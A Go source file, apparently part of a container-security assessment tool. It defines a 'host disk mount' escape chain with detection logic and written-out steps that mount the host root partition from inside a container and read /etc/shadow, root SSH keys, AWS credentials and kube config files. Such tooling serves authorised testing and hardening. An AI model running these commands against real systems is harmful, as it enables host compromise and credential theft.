package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// hostDiskMount — when raw block devices are visible inside the workload,
// the container is one `mount` away from reading any file on the host.
type hostDiskMount struct{ exploit.Base }

func (c *hostDiskMount) Matches(results []check.Result) *exploit.Match {
	if !exploit.HasFailedID(results, "host.devices.raw_block") {
		return nil
	}
	conf := "medium"
	if exploit.HasFailedID(results, "container.privileged") ||
		exploit.EvidenceContains(results, "container.capabilities.dangerous", "CAP_SYS_ADMIN") {
		conf = "high"
	}
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"host.devices.raw_block"},
		Optional:   []string{"container.privileged", "container.capabilities.dangerous"},
		Confidence: conf,
	}
}

func (c *hostDiskMount) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title:   "Identify the host root partition",
			Command: `lsblk; ls -l /dev/sda* /dev/vd* /dev/nvme0n1* 2>/dev/null`,
			Note:    "Look for the largest partition; that's typically /.",
		},
		{
			Title: "Mount it inside the container",
			Command: `mkdir -p /mnt/host
mount /dev/sda1 /mnt/host  # adjust device as needed
ls /mnt/host/etc`,
			Note: "Requires CAP_SYS_ADMIN. If mount fails with EPERM, the cap is missing or the kernel masks the device.",
		},
		{
			Title: "Loot the credentials store",
			Command: `cat /mnt/host/etc/shadow
ls /mnt/host/root/.ssh
cat /mnt/host/root/.aws/credentials 2>/dev/null
find /mnt/host -name '*.kube*' 2>/dev/null`,
			Note: "Standard offensive recon paths. Do not exfiltrate without authorisation.",
		},
	}
}

func init() {
	exploit.Register(&hostDiskMount{Base: exploit.Base{
		IDValue:       "chain.host_disk_mount",
		NameValue:     "Mount host disk from inside container",
		GoalValue:     "Read /etc/shadow, SSH keys, AWS credentials and other host filesystem secrets.",
		RiskValue:     exploit.RiskWrite,
		SeverityValue: check.SeverityCritical,
		ReferencesValue: []string{
			"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security",
		},
		AttackValue: []string{"T1611", "T1003.008"},
	}})
}
